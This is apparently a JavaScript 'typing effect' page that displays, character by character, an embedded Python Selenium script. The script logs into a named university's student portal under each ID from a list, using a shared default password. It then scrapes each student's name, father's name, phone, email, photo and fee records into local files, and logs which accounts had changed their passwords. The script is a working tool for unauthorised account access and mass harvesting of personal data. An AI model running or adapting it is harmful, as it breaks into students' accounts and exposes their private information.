const code = `from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime
import requests
import time

## just to calculate time
def time_taken(count):
    file = open("user_id.txt",'r')
    no_userid = len(file.readlines())
    time_taken = no_userid*20
    id_rem = no_userid - count
    print(f'[+] No of userid Remaining => {id_rem}')
    time_rem = id_rem * 22
    convert(time_rem)

def convert(seconds):
    seconds = seconds % (24 * 3600)
    hour = seconds // 3600
    seconds %= 3600
    minutes = seconds // 60
    seconds %= 60
    print(f'[+] Time Taken to process remening ids => {hour}:{minutes}:{seconds}')

## banner
def banner():
    print("-"*50)

## Main program --------------------------------

def fetch_data(driver, userid):
    # Fetch User data using the R-Id and Passwd
    driver.get("https://univ.jnujaipur.ac.in/Account/Login")
    print("Opening Website for {userid} ....")

    jnu_id = "R"+userid
    jnu_pass = "jnu@123"
    username = WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.CSS_SELECTOR, '#username')))
    username = driver.find_element(By.CSS_SELECTOR,'#username')
    username.send_keys(jnu_id)

    password = driver.find_element(By.CSS_SELECTOR,'#password')
    password.send_keys(jnu_pass)

    login_btn = driver.find_element(By.XPATH,'/html/body/div[2]/div/div/div/div[2]/div[1]/form/div/div[4]/button')
    login_btn.click()

    time.sleep(2)

    try:
        login_ch = driver.find_element(By.CSS_SELECTOR,'.subheader-title')
        login_check = login_ch.text
        if (login_check == "Student Dashboard" ):
            print("[+] Login Pass Successful ")
    except:
        print("[--] Check Another Password")

    driver.get("https://univ.jnujaipur.ac.in/FeedBackManagement/StudentComplaintBox")

    req_btn = driver.find_element(By.CSS_SELECTOR,'#btnAddfeedback')
    time.sleep(3)
    req_btn.click()
    ## https://univ.jnujaipur.ac.in/FeedBackManagement/AddComplaint
    # /html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[4]/p[2]/b
    time.sleep(2)
    full_data = driver.find_element(By.XPATH,'/html/body/div[2]/div/div/main/div[3]/div/div/div/div')

    R_id = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[1]/p[2]/b")
    Roll_no = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[1]/p[4]")
    Student = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[2]/p[2]/b")
    department = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[2]/p[4]/b")
    Program = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[3]/p[2]/b")
    Semester = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[3]/p[4]/b")
    Contact = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[4]/p[2]/b")
    Email = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[4]/p[4]/b")
    Father = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[5]/p[2]/b")
    Ima = driver.find_element(By.XPATH,"/html/body/div[2]/div/div/main/div[3]/div/div/div/div/div[5]/p[4]/b/img")
    image = Ima.get_attribute("src")

    user_data = {"R-Id": R_id.text,
                 "Roll No.": Roll_no.text,
                 "Student Name": Student.text,
                 "Father Name": Father.text,
                 "Department": department.text,
                 "Program": Program.text,
                 "Semester": Semester.text,
                 "Contact": Contact.text,
                 "Email": Email.text,
                 "Image": image
                 }

    print()
    print(user_data)
    print()

    print(f'{"-"*50}')
    print(f'R-Id = {R_id.text}')
    print(f'Roll No. = {Roll_no.text} ')
    print(f'Student Name = {Student.text} ')
    print(f'Department = {department.text} ')
    print(f'Program = {Program.text} ')
    print(f'Semester = {Semester.text} ')
    print(f'Contact = {Contact.text} ')
    print(f'Email = {Email.text} ')
    print(f'Father Name = {Father.text}')
    print(f'Image = {image}')
    print(f'{"-"*50}\n')

    # Downlaod Image 
    image_url = image
    img_data = requests.get(image_url).content
    img_path = "student_image/"
    img_name = img_path+R_id.text+" "+Student.text+" "+Program.text+".jpg"
    try:
        with open(img_name, 'wb') as handler:
            handler.write(img_data)
            print(f"[+] {img_name} Downlaoded SuccessFully ")
            
    except:
        print(f"[--] {img_name} Download Error")

    # Fees info 
    time.sleep(2)
    driver.get("https://univ.jnujaipur.ac.in/StudentDashboard/StudentOnlineDuesPay#")

    time.sleep(2)
    fee_info = driver.find_element(By.XPATH,'//*[@id="datatable_tabletools1"]')
    print(f'-------------------------------------------\n{fee_info.text}\n-------------------------------------------')

    ## data writing in file
    user_data["Fees Info"] = fee_info.text
    written_data = "\n"+ str(user_data) 
    file2 = open("user_data.txt","a")
    file2.writelines(written_data + " , ")
    file2.close()    
    # Logout process
    
    driver.get("https://univ.jnujaipur.ac.in/Account/Login")

    print("[+] Logout Successfully")

    # Reload the program with different R-Id -----------------------------------


############################################################################
# No. of R-Id want to process 


# Opening webdriver
driver = webdriver.Firefox()
driver1 = webdriver.Firefox()

# reading file lines

file = open("user_id.txt",'r')
count = 0
for line in file.readlines():
    banner()
    print(f'File No. {count} ==>')
    time_taken(count)
    print(f"[++] Processing start for R{line}")
    current_user_id = "R"+str(line)
    try:
        fetch_data(driver, line)
        print(f"[++] R{line} Data Fetch Done")
        log = "\n[+] " + " Data Fetch Done " + str(line)
        log_file = open("log_file.txt","a")
        log_file.writelines(log)
        log_file.close()
    except:
        print(f"[--] Skipping R{line} due to wrong password")
        log = "\n\n[-] " + " Password has been changed " + str(line)
        log_file = open("log_file.txt","a")
        log_file.writelines(log)
        log_file.close()
    count += 1
    
    banner()


time.sleep(5)
driver.close()
file.close()
print(f'[+][+] Last processed R-Id is {current_user_id}')
print(f'[+][+] All {count} File data has been fetched')
`;

let currentIndex = 0;
const codeDisplay = document.getElementById('code-display');
let typingSpeed = 100; // Initial typing speed in milliseconds
let interval;

function scrollToBottom() {
    window.scrollTo(0, document.body.scrollHeight);
}

document.addEventListener('keydown', () => {
    interval = setInterval(() => {
        if (currentIndex < code.length) {
            codeDisplay.textContent += code[currentIndex];
            currentIndex++;
            scrollToBottom();
        } else {
            clearInterval(interval);
        }
    }, typingSpeed);
});

